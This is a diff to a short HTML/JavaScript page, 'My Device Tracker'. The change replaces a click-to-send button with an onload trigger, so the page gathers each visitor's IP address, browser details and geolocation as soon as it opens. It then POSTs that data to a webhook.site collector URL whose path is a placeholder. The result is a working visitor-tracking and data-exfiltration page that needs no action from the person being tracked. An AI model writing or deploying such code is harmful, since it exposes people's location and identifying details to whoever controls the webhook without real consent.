@@ -3,20 +3,19 @@
 <head>
   <title>My Device Tracker</title>
 </head>
-<body>
+<body onload="logInfo()">
   <h2>Device Info Logger</h2>
-  <p>Click the button below to send your device info.</p>
-  <button onclick="logInfo()">Ping My Device</button>
-  <pre id="result">Waiting...</pre>
+  <p>Info will auto-send when this page is opened.</p>
+  <pre id="result">Collecting...</pre>
 
   <script>
     async function logInfo() {
       document.getElementById("result").textContent = "Collecting info...";
-      
+
       const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
       const userAgent = navigator.userAgent;
       const platform = navigator.platform;
-      
+
       const info = {
         ip: ipData.ip,
         userAgent: userAgent,
@@ -30,24 +29,22 @@
           info.longitude = position.coords.longitude;
           sendData(info);
         }, () => {
-          sendData(info);
+          sendData(info); // location denied
         });
       } else {
-        sendData(info);
+        sendData(info); // geolocation not supported
       }
     }
 
     function sendData(data) {
       document.getElementById("result").textContent = JSON.stringify(data, null, 2);
       
-      // Replace with your webhook URL or remove this fetch to disable sending
-      fetch("https://webhook.site/your-unique-url", {
+      // Replace this with your webhook
+      fetch("https://webhook.site/YOUR_REAL_WEBHOOK_URL", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
-      }).catch(() => {
-        console.log("Failed to send data");
-      });
+      }).catch(err => console.error("Failed to send:", err));
     }
   </script>
 </body>
